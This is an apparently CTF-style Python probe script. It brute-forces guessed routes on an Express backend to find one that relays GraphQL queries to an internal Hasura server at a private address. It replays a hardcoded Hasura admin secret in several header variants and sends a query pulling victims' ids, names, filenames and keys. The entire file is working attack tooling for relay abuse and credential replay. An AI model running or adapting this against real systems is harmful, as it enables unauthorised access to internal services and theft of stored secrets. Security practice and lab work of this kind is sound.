"""Probe Express backend for any endpoint that proxies GraphQL upstream.

Goal: find a way to use the backend (which holds the Hasura admin secret)
as a relay to query the internal GraphQL at 192.168.150.10 from outside.

Strategy:
  1. Map all routes hinted at by the index/JS bundles.
  2. For each candidate POST endpoint, try sending a GraphQL-shaped body.
     Watch for any JSON response containing "data" / "victims" / "errors"
     keys (Hasura signature) instead of the usual app response.
  3. Also test header-injection variants (x-hasura-* headers passed through).
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import sys
import urllib.request
import urllib.error
from typing import Iterable

DEFAULT_GRAPHQL_BODY = {
    "query": "query { victims { id name filename key } }",
    "variables": {},
}

ROUTE_GUESSES: tuple[str, ...] = (
    "/proof",
    "/api/proof",
    "/api",
    "/api/graphql",
    "/graphql",
    "/v1/graphql",
    "/v1/graphql/",
    "/hasura",
    "/hasura/v1/graphql",
    "/admin/graphql",
    "/internal/graphql",
    "/relay",
    "/proxy",
    "/api/relay",
    "/api/query",
    "/query",
    "/api/victims",
    "/victims",
    "/downloads",
    "/wallet",
    "/api/wallet",
)

HEADER_VARIANTS: tuple[dict[str, str], ...] = (
    {},
    {"x-hasura-admin-secret": "s3cr3754uc35432"},
    {"X-Hasura-Admin-Secret": "s3cr3754uc35432"},
    {"hasura-admin-secret": "s3cr3754uc35432"},
)


def _request(
    method: str,
    url: str,
    body: bytes | None,
    headers: dict[str, str],
    timeout: float = 8.0,
) -> tuple[int, dict[str, str], bytes]:
    req = urllib.request.Request(url=url, data=body, method=method)
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read() if hasattr(e, "read") else b""
    except Exception as e:  # noqa: BLE001
        return 0, {}, f"<err:{e}>".encode()


def _looks_like_graphql_response(body: bytes) -> bool:
    if not body:
        return False
    try:
        text = body.decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return False
    if not text.lstrip().startswith("{"):
        return False
    lower = text.lower()
    hits = (
        '"data"' in lower
        or '"errors"' in lower and "graphql" in lower
        or '"victims"' in lower
        or "x-hasura" in lower
    )
    return hits


def probe(
    base: str,
    cookie: str | None,
    extra_routes: Iterable[str],
    verbose: bool,
) -> list[dict]:
    findings: list[dict] = []
    routes = list(dict.fromkeys((*ROUTE_GUESSES, *extra_routes)))
    body_json = json.dumps(DEFAULT_GRAPHQL_BODY).encode()

    for route in routes:
        url = base.rstrip("/") + route
        for method in ("GET", "POST"):
            for header_set in HEADER_VARIANTS:
                headers = {
                    "User-Agent": "carpe-probe/1.0",
                    "Accept": "application/json,*/*",
                }
                if cookie:
                    headers["Cookie"] = cookie
                if method == "POST":
                    headers["Content-Type"] = "application/json"
                headers.update(header_set)

                body = body_json if method == "POST" else None
                status, resp_headers, resp_body = _request(method, url, body, headers)
                interesting = (
                    _looks_like_graphql_response(resp_body)
                    or (status not in (0, 404, 405) and method == "POST")
                )
                if verbose:
                    snippet = resp_body[:120].decode("utf-8", "replace").replace("\n", " ")
                    print(f"[{status}] {method:4s} {route:25s} hdr={list(header_set)} :: {snippet}")
                if interesting:
                    findings.append(
                        {
                            "url": url,
                            "method": method,
                            "status": status,
                            "headers_sent": header_set,
                            "resp_excerpt": resp_body[:600].decode("utf-8", "replace"),
                        }
                    )
    return findings


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", required=True, help="e.g. 10.113.161.234")
    p.add_argument("--scheme", default="http")
    p.add_argument("--cookie", default=None, help="full Cookie header (optional)")
    p.add_argument("--extra-route", action="append", default=[])
    p.add_argument("--verbose", action="store_true")
    args = p.parse_args()

    base = f"{args.scheme}://{args.target}"
    print(f"[i] Probing {base} for GraphQL relay endpoints...")
    findings = probe(base, args.cookie, args.extra_route, args.verbose)

    print()
    print(f"[+] Interesting responses: {len(findings)}")
    for f in findings:
        print(f"  - {f['method']} {f['url']} -> {f['status']}")
        print(f"    sent headers: {f['headers_sent']}")
        print(f"    body: {f['resp_excerpt'][:300]!r}")
        print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
